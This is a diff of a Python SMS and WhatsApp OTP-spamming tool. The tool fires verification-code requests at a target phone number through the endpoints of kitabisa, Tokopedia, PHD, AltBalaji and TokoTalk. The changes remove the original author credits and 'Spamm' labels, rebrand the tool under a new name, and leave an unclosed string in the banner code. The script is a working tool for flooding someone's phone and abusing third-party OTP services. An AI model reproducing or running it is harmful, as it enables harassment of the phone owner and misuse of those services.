@@ -1,11 +1,7 @@
 #!/usr/bin/python
 import requests,random,json,time,sys,os,re
 # -----------------------------------------------------------
-# Tidak ada author Untuk Sc ini kecuali ./Kitsune yg Telah Mendesign Dengan Sempurna
-# Update 26 january 2020 21:57
-# Recode!, dosa Tanggung Sendiri
-# Thanks For MyFriends, FourX, MhankBarBar, Maulana, Rexy
-# Underground Science And Termux Tutorial Group
+# Created By SIDHANIE
 # ---------------------------------------------------------------
 
 # -----------------------WARNA----------------------------
@@ -30,9 +26,9 @@ class spam:
 	def spam(self):
 		hasil=requests.get(f'https://core.ktbs.io/v2/user/registration/otp/{self.nomer}')
 		if hasil.status_code == 200:
-			return f'\x1b[92mSpamm kitabisa {self.nomer} \033[1;32mSuccess!'
+			return f'\x1b[92mkitabisa {self.nomer} \033[1;32mSuccess!'
 		elif hasil.status_code == 500:
-			return f'\x1b[91mSpamm kitabisa {self.nomer} \x1b[91mFail!'
+			return f'\x1b[91mkitabisa {self.nomer} \x1b[91mFail!'
 			
 	def tokped(self):
 		rands=random.choice(open('ua.txt').readlines()).split('\n')[0]
@@ -59,17 +55,17 @@ class spam:
 		}
 		req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = kirim, data = formulir).text
 		if 'Anda sudah melakukan 3 kali pengiriman kode' in req:
-			return f'\x1b[91mSpamm Tokped {self.nomer} \x1b[91mFail!'
+			return f'\x1b[91mTokped {self.nomer} \x1b[91mFail!'
 		else:
-			return f'\x1b[92mSpamm Tokped {self.nomer} {h}Success!'
+			return f'\x1b[92mTokped {self.nomer} {h}Success!'
 
 	def phd(self):
 		param = {'phone_number':self.nomer}
 		r = requests.post('https://www.phd.co.id/en/users/sendOTP', data=param)
 		if 'We have sent an OTP to your phone, Please enter the 4 digit code.' in r.text:
-			return f'\x1b[92mSpamm PHD {self.nomer} {h}Success!'
+			return f'\x1b[92mPHD {self.nomer} {h}Success!'
 		else:
-			return f'\x1b[91mSpamm PHD {self.nomer} {m}Fail!'
+			return f'\x1b[91mPHD {self.nomer} {m}Fail!'
 			
 	def balaji(self):
 		urlb="https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID"
@@ -91,9 +87,9 @@ class spam:
 			}
 		req=requests.post(urlb,data=json.dumps(ata),headers=head)
 		if '{"status":"ok"}' in req.text:
-			return f'\x1b[92mSpamm BALAJI {self.nomer} {h}Success!'
+			return f'\x1b[92mBALAJI {self.nomer} {h}Success!'
 		else:
-			return f'\x1b[92mSpamm BALAJI {self.nomer} {m}Fail!'
+			return f'\x1b[92mBALAJI {self.nomer} {m}Fail!'
 	def TokoTalk(self):
 		data='{"key":"phone","value":"'+str(self.nomer)+'"}'
 		head={
@@ -101,9 +97,9 @@ class spam:
 			"content-type":"application/json;charset=UTF-8"
 		}
 		if 'expireAt' in requests.post("https://api.tokotalk.com/v1/no_auth/verifications",data = data,headers=head).text:
-			return f'\x1b[92mSpamm TokoTalk {self.nomer} {h}Success!'
+			return f'\x1b[92mTokoTalk {self.nomer} {h}Success!'
 		else:
-			return f'\x1b[92mSpamm TokoTalk {self.nomer} {m}Fail!'
+			return f'\x1b[92mTokoTalk {self.nomer} {m}Fail!'
 # ------------------------------------------------------------
 
 # ---------------------------Fungsi----------------------------
@@ -209,18 +205,16 @@ def multi():
 #-------------------------Fungsi Banner-----------------------
 def logo():
 	os.system('clear')
-	auth=m+'  Author : '+k+'./kitsune | Modified By: github.com/imajraj'
-	# jika ingin m3namambah kan variabel dan mengubah data variabel kitsune bisa menambahkan %s menambahkan variabel terus di ubah menjjadu string, %d = mengubah data menjadi decimal , %i = mengubah data menjadi integer
+	auth=m+'  Created By.Sidhanie
 	return '''
-%s╭━┳━╭━╭━╮%s╮╲╲╲╲╲╲%s╔═╗╔═╗╔═╗╔╦╗
-%s┃┈┈┈┣▅╋▅┫┃%s╲╲╲╲╲╲%s╚═╗╠═╝╠═╣║║║
-%s┃┈┃┈╰━╰━━━━━━╮%s╲╲%s╚═╝╩  ╩ ╩╩ ╩
-%s╰┳╯┈┈┈┈┈┈┈┈┈◢▉◣%s╲%s╔═╗╔╦╗╔═╗
-%s╲┃┈┈┈┈┈┈┈┈┈┈▉▉▉%s╲%s╚═╗║║║╚═╗
-%s╲┃┈┈┈┈┈┈┈┈┈┈◥▉◤%s╲%s╚═╝╩ ╩╚═╝
-%s╲┃┈┈┈┈╭━┳━━━━╯%s╲╲%s╦ ╦╦ ╦╔═╗╔╦╗╔═╗╔═╗╔═╗╔═╗
-%s╲┣━━━━━━┫%s╲╲╲╲╲╲╲%s║║║╠═╣╠═╣ ║ ╚═╗╠═╣╠═╝╠═╝
-%s╲┃┈┈┈┈┈┈┃%s╲╲╲╲╲╲╲%s╚╩╝╩ ╩╩ ╩ ╩ ╚═╝╩ ╩╩  ╩  
+                   ╔═╗╔═╗╔═╗╔╦╗
+                   ╚═╗╠═╝╠═╣║║║
+                   ╚═╝╩  ╩ ╩╩ ╩
+              ╦ ╦╦ ╦╔═╗╔╦╗╔═╗╔═╗╔═╗╔═╗
+              ║║║╠═╣╠═╣ ║ ╚═╗╠═╣╠═╝╠═╝
+              ╚╩╝╩ ╩╩ ╩ ╩ ╚═╝╩ ╩╩  ╩ 
+=====================================================
+=====================================================
 %s''' % (k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,auth)
 # -----------------------------------------------------------
 def termux():
